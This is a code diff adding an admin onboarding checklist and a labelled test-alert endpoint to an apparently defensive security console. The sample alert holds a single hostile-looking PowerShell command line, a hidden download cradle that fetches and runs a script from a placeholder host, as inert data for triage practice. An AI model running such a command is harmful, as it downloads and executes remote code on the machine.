@@ -1934,6 +1934,34 @@ def api_attention(current_user: Dict[str, Any] = Depends(get_current_user)):
     }
 
 
+@app.get('/api/onboarding')
+def api_onboarding(current_user: Dict[str, Any] = Depends(require_admin)):
+    """The first-run checklist an empty console shows an admin: connect a SIEM (the
+    webhook token gates ingestion), get an alert, investigate it, switch Triage on."""
+    return {
+        "siem": bool((settings_store.get("webhook_token") or "").strip()),
+        "alert": alerts_inbox.count() > 0,
+        "investigated": alerts_inbox.any_investigated(),
+        "triage": bool(agents.load_config()["triage"]["enabled"]),
+    }
+
+
+@app.post('/api/alerts/test')
+def api_test_alert(current_user: Dict[str, Any] = Depends(require_admin)):
+    """One clearly labelled sample alert in the shared inbox, so the checklist can be
+    walked before a SIEM is wired up."""
+    rec = alerts_inbox.ingest({
+        "title": "[Test] PowerShell download cradle on nullshift-test-host",
+        "severity": "high",
+        "hostname": "nullshift-test-host",
+        "description": "Sample alert from the NullShift first-run checklist. Safe to dismiss.",
+        "process": {"name": "powershell.exe", "command_line":
+                    "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')\""},
+    }, source_hint="nullshift-test")
+    log.info("Test alert %s created by %s", rec["id"], current_user["username"])
+    return rec
+
+
 # ─── Autonomous agents (see app/agents.py) ───────────────────────────────────
 
 @app.on_event("startup")
